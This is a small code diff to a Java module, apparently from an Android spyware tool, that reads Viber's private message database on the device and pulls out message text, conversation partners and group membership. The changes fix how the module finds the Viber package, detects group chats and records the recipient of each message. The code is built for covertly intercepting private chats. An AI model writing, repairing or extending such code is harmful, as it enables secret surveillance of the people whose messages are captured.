@@ -31,7 +31,7 @@ public class ChatViber extends SubModuleChat {
 	private static final String TAG = "ChatViber";
 
 	private static final int PROGRAM = 0x09;
-	String pObserving = "viber";
+	String pObserving = "com.viber";
 
 	String dbDir = "/data/data/com.viber.voip/databases";
 	String dbFile = "viber_messages";
@@ -145,7 +145,7 @@ public class ChatViber extends SubModuleChat {
 					long lastConvId = lastViber.containsKey(thread) ? lastViber.get(thread) : 0;
 
 					if (sc.date > lastConvId) {
-						if (groups.isGroup(thread) && !groups.hasMemoizedGroup(thread)) {
+						if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
 							fetchParticipants(helper, thread);
 							groups.addPeerToGroup(thread, account);
 						}
@@ -265,7 +265,7 @@ public class ChatViber extends SubModuleChat {
 								+ incoming);
 					}
 
-					boolean isGroup = groups.isGroup(Long.toString(conversation.id));
+					boolean isGroup = conversation.isGroup();
 
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
@@ -287,7 +287,7 @@ public class ChatViber extends SubModuleChat {
 						toDisplay = to;
 					} else {
 						to = incoming ? conversation.account : conversation.remote;
-						toDisplay = incoming ? conversation.account : conversation.account;
+						toDisplay = incoming ? conversation.account : conversation.remote;
 					}
 
 					if (!StringUtils.isEmpty(body)) {
